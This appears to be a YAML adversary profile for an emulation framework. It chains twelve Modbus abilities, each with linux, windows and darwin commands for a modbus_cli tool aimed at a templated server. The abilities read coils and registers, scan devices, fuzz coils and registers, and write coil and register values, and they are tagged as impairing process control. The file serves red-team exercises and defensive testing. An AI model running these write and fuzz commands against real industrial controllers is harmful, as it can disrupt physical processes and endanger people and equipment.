id: 2e8972da-6130-460c-bc0e-2707087861c4
name: Modbus Adversary
description: ---
objective: 495a9828-cab1-44dd-a0ca-66e58177d8cc
atomic_ordering:
- 40f78a8f-2aaa-4b1b-872f-7c6b0f1ddf3e
- 2a6e8c8e-f350-11ed-9156-23436b8f0e58
- d80b9cd5-b1d8-482a-a745-71d74f9d0885
- 9360ba0d-46a3-47a1-bbe6-e6c875790500
- 001e21ea-61b5-4b78-b79e-9d5687d819bd
- bc8961a2-7534-4b2a-bbc3-2456f58243be
- 3946b6da-c570-47cd-b63f-c13875297cb4
- 7f43fa44-c2aa-4bb6-ba4b-2c1e58df3b51
- fe321da2-e183-44a3-b423-b8cba9a8bda0
- 0f16b341-9730-4553-b6d6-8eb8def02c81
- 056e6289-4cbf-417f-928a-d75125e4db4f
- d6991b6b-d3b2-4398-ad3f-d736ae09acf9
abilities:
 40f78a8f-2aaa-4b1b-872f-7c6b0f1ddf3e:
  name:  Modbus - Fuzz Coils
  tactic:  impair-process-control
  technique_name:  "Brute Force I/O"
  technique_id:  T0806
  executors:
   - sh:
     platform: linux
     command: |
       ./modbus_cli #{modbus.server.ip} --port #{modbus.server.port} fuzz_c  #{modbus.fuzz_coil.start} #{modbus.fuzz_coil.end} #{modbus.fuzz_coil.count}  --wait #{modbus.fuzz_coil.wait}

   - psh:
     platform: windows
     command: |
       .\modbus_cli.exe #{modbus.server.ip} --port #{modbus.server.port} fuzz_c  #{modbus.fuzz_coil.start} #{modbus.fuzz_coil.end} #{modbus.fuzz_coil.count}  --wait #{modbus.fuzz_coil.wait}

   - sh:
     platform: darwin
     command: |
       ./modbus_cli_darwin #{modbus.server.ip} --port #{modbus.server.port} fuzz_c  #{modbus.fuzz_coil.start} #{modbus.fuzz_coil.end} #{modbus.fuzz_coil.count}  --wait #{modbus.fuzz_coil.wait}

 2a6e8c8e-f350-11ed-9156-23436b8f0e58:
  name:  Modbus - Fuzz Registers
  tactic:  impair-process-control
  technique_name:  "Brute Force I/O"
  technique_id:  T0806
  executors:
   - sh:
     platform: linux
     command: |
       ./modbus_cli #{modbus.server.ip} --port #{modbus.server.port} fuzz_r  #{modbus.fuzz_register.start} #{modbus.fuzz_register.end} #{modbus.fuzz_register.count}  --min #{modbus.fuzz_register.min} --max #{modbus.fuzz_register.max} --wait #{modbus.fuzz_register.wait}

   - psh:
     platform: windows
     command: |
       .\modbus_cli.exe #{modbus.server.ip} --port #{modbus.server.port} fuzz_r  #{modbus.fuzz_register.start} #{modbus.fuzz_register.end} #{modbus.fuzz_register.count}  --min #{modbus.fuzz_register.min} --max #{modbus.fuzz_register.max} --wait #{modbus.fuzz_register.wait}

   - sh:
     platform: darwin
     command: |
       ./modbus_cli_darwin #{modbus.server.ip} --port #{modbus.server.port} fuzz_r  #{modbus.fuzz_register.start} #{modbus.fuzz_register.end} #{modbus.fuzz_register.count}  --min #{modbus.fuzz_register.min} --max #{modbus.fuzz_register.max} --wait #{modbus.fuzz_register.wait}

 d80b9cd5-b1d8-482a-a745-71d74f9d0885:
  name:  Modbus - Read Coils
  tactic:  collection
  technique_name:  "Point & Tag Identification"
  technique_id:  T0861
  executors:
   - sh:
     platform: linux
     command: |
       ./modbus_cli #{modbus.server.ip} --port #{modbus.server.port} read_c #{modbus.read_coil.start} #{modbus.read_coil.count}

   - psh:
     platform: windows
     command: |
       .\modbus_cli.exe #{modbus.server.ip} --port #{modbus.server.port} read_c #{modbus.read_coil.start} #{modbus.read_coil.count}

   - sh:
     platform: darwin
     command: |
       ./modbus_cli_darwin #{modbus.server.ip} --port #{modbus.server.port} read_c #{modbus.read_coil.start} #{modbus.read_coil.count}

 9360ba0d-46a3-47a1-bbe6-e6c875790500:
  name:  Modbus - Read Device Information
  tactic:  discovery
  technique_name:  "Remote System Information Discovery"
  technique_id:  T0888
  executors:
   - sh:
     platform: linux
     command: |
       ./modbus_cli #{modbus.server.ip} --port #{modbus.server.port} read_device_info --level #{modbus.read_device_info.level}

   - psh:
     platform: windows
     command: |
       .\modbus_cli.exe #{modbus.server.ip} --port #{modbus.server.port} read_device_info --level #{modbus.read_device_info.level}

   - sh:
     platform: darwin
     command: |
       ./modbus_cli_darwin #{modbus.server.ip} --port #{modbus.server.port} read_device_info --level #{modbus.read_device_info.level}

 001e21ea-61b5-4b78-b79e-9d5687d819bd:
  name:  Modbus - Read Discrete Inputs
  tactic:  collection
  technique_name:  "Point & Tag Identification"
  technique_id:  T0861
  executors:
   - sh:
     platform: linux
     command: |
       ./modbus_cli #{modbus.server.ip} --port #{modbus.server.port} read_di #{modbus.read_discrete.start} #{modbus.read_discrete.count}

   - psh:
     platform: windows
     command: |
       .\modbus_cli.exe #{modbus.server.ip} --port #{modbus.server.port} read_di #{modbus.read_discrete.start} #{modbus.read_discrete.count}

   - sh:
     platform: darwin
     command: |
       ./modbus_cli_darwin #{modbus.server.ip} --port #{modbus.server.port} read_di #{modbus.read_discrete.start} #{modbus.read_discrete.count}

 bc8961a2-7534-4b2a-bbc3-2456f58243be:
  name:  Modbus - Read Holding Registers
  tactic:  collection
  technique_name:  "Point & Tag Identification"
  technique_id:  T0861
  executors:
   - sh:
     platform: linux
     command: |
       ./modbus_cli #{modbus.server.ip} --port #{modbus.server.port} read_hr #{modbus.read_holding.start} #{modbus.read_holding.count}

   - psh:
     platform: windows
     command: |
       .\modbus_cli.exe #{modbus.server.ip} --port #{modbus.server.port} read_hr #{modbus.read_holding.start} #{modbus.read_holding.count}

   - sh:
     platform: darwin
     command: |
       ./modbus_cli_darwin #{modbus.server.ip} --port #{modbus.server.port} read_hr #{modbus.read_holding.start} #{modbus.read_holding.count}

 3946b6da-c570-47cd-b63f-c13875297cb4:
  name:  Modbus - Read Input Registers
  tactic:  collection
  technique_name:  "Point & Tag Identification"
  technique_id:  T0861
  executors:
   - sh:
     platform: linux
     command: |
       ./modbus_cli #{modbus.server.ip} --port #{modbus.server.port} read_ir #{modbus.read_input.start} #{modbus.read_input.count}

   - psh:
     platform: windows
     command: |
       .\modbus_cli.exe #{modbus.server.ip} --port #{modbus.server.port} read_ir #{modbus.read_input.start} #{modbus.read_input.count}

   - sh:
     platform: darwin
     command: |
       ./modbus_cli_darwin #{modbus.server.ip} --port #{modbus.server.port} read_ir #{modbus.read_input.start} #{modbus.read_input.count}

 7f43fa44-c2aa-4bb6-ba4b-2c1e58df3b51:
  name:  Modbus - Scan Device
  tactic:  collection
  technique_name:  "Automated Collection"
  technique_id:  T0802
  executors:
   - sh:
     platform: linux
     command: |
       ./modbus_cli #{modbus.server.ip} --port #{modbus.server.port} scan

   - psh:
     platform: windows
     command: |
       .\modbus_cli.exe #{modbus.server.ip} --port #{modbus.server.port} scan

   - sh:
     platform: darwin
     command: |
       ./modbus_cli_darwin #{modbus.server.ip} --port #{modbus.server.port} scan

 fe321da2-e183-44a3-b423-b8cba9a8bda0:
  name:  Modbus - Write Multiple Coils
  tactic:  impair-process-control
  technique_name:  "Brute Force I/O"
  technique_id:  T0806
  executors:
   - sh:
     platform: linux
     command: |
       ./modbus_cli #{modbus.server.ip} --port #{modbus.server.port} write_multi_c #{modbus.write_coil.start} #{modbus.write_coil.values}

   - psh:
     platform: windows
     command: |
       .\modbus_cli.exe #{modbus.server.ip} --port #{modbus.server.port} write_multi_c #{modbus.write_coil.start} #{modbus.write_coil.values}

   - sh:
     platform: darwin
     command: |
       ./modbus_cli_darwin #{modbus.server.ip} --port #{modbus.server.port} write_multi_c #{modbus.write_coil.start} #{modbus.write_coil.values}

 0f16b341-9730-4553-b6d6-8eb8def02c81:
  name:  Modbus - Write Multiple Registers
  tactic:  impair-process-control
  technique_name:  "Brute Force I/O"
  technique_id:  T0806
  executors:
   - sh:
     platform: linux
     command: |
       ./modbus_cli #{modbus.server.ip} --port #{modbus.server.port} write_multi_r #{modbus.write_register.start} #{modbus.write_register.values}

   - psh:
     platform: windows
     command: |
       .\modbus_cli.exe #{modbus.server.ip} --port #{modbus.server.port} write_multi_r #{modbus.write_register.start} #{modbus.write_register.values}

   - sh:
     platform: darwin
     command: |
       ./modbus_cli_darwin #{modbus.server.ip} --port #{modbus.server.port} write_multi_r #{modbus.write_register.start} #{modbus.write_register.values}

 056e6289-4cbf-417f-928a-d75125e4db4f:
  name:  Modbus - Write Single Coil
  tactic:  impair-process-control
  technique_name:  "Modify Parameter"
  technique_id:  T0836
  executors:
   - sh:
     platform: linux
     command: |
       ./modbus_cli #{modbus.server.ip} --port #{modbus.server.port} write_c #{modbus.write_coil.start} #{modbus.write_coil.value}

   - psh:
     platform: windows
     command: |
       .\modbus_cli.exe #{modbus.server.ip} --port #{modbus.server.port} write_c #{modbus.write_coil.start} #{modbus.write_coil.value}

   - sh:
     platform: darwin
     command: |
       ./modbus_cli_darwin #{modbus.server.ip} --port #{modbus.server.port} write_c #{modbus.write_coil.start} #{modbus.write_coil.value}

 d6991b6b-d3b2-4398-ad3f-d736ae09acf9:
  name:  Modbus - Write Single Register
  tactic:  impair-process-control
  technique_name:  "Modify Parameter"
  technique_id:  T0836
  executors:
   - sh:
     platform: linux
     command: |
       ./modbus_cli #{modbus.server.ip} --port #{modbus.server.port} write_r #{modbus.write_register.start} #{modbus.write_register.value}

   - psh:
     platform: windows
     command: |
       .\modbus_cli.exe #{modbus.server.ip} --port #{modbus.server.port} write_r #{modbus.write_register.start} #{modbus.write_register.value}

   - sh:
     platform: darwin
     command: |
       ./modbus_cli_darwin #{modbus.server.ip} --port #{modbus.server.port} write_r #{modbus.write_register.start} #{modbus.write_register.value}